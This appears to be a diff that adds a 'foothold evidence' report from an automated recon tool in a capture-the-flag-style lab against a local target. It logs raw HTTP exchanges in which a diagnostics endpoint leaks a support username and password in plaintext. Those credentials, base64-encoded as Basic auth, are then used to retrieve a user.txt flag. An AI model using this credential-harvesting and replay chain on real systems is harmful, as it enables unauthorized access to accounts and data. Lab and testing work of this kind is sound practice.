@@ -1,0 +1,53 @@
+FOOTHOLD EVIDENCE
+============================================================
+
+Chain: signal ROUTE (vhost + route proof) -> GET /ops-diagnostics
+(credentials) -> GET /user.txt (authorized flag retrieval).
+No request beyond /user.txt was made -- see recon_engine/adapters/
+foothold.py's module docstring for the structural boundary.
+
+--- /ops-diagnostics ---
+observed_at : 2026-07-23T17:43:20Z
+target      : 127.0.0.1:18467
+vhost       : console-9fd65fe.keystone.local
+status      : 200
+source_file : 127.0.0.1_18467_console-9fd65fe.keystone.local_ops-diagnostics.raw
+
+raw exchange:
+GET /ops-diagnostics HTTP/1.1
+Host: console-9fd65fe.keystone.local
+User-Agent: recon-engine/foothold
+
+HTTP/1.1 200 OK
+Server: TransitGateway/2.4 
+Date: Thu, 23 Jul 2026 17:43:20 GMT
+Content-Type: application/json
+Content-Length: 178
+X-Runtime-Profile: P6
+
+{"note": "route proof is emitted by the signal service", "signal_service": 23390, "status": "degraded", "support_password": "WRuJVBgiyjRoZxAQtTG1", "support_user": "reviewer97"}
+
+
+--- /user.txt ---
+observed_at : 2026-07-23T17:43:20Z
+target      : 127.0.0.1:18467
+vhost       : console-9fd65fe.keystone.local
+status      : 200
+source_file : 127.0.0.1_18467_console-9fd65fe.keystone.local_user.txt.raw
+
+raw exchange:
+GET /user.txt HTTP/1.1
+Host: console-9fd65fe.keystone.local
+User-Agent: recon-engine/foothold
+Authorization: Basic cmV2aWV3ZXI5NzpXUnVKVkJnaXlqUm9aeEFRdFRHMQ==
+X-Route-Key: 058188d017e0d4a6
+
+HTTP/1.1 200 OK
+Server: TransitGateway/2.4 
+Date: Thu, 23 Jul 2026 17:43:20 GMT
+Content-Type: text/plain; charset=utf-8
+Content-Length: 35
+X-Runtime-Profile: P6
+
+UBI-EH-A1-35C4A1DC05CB059BFB870348
+
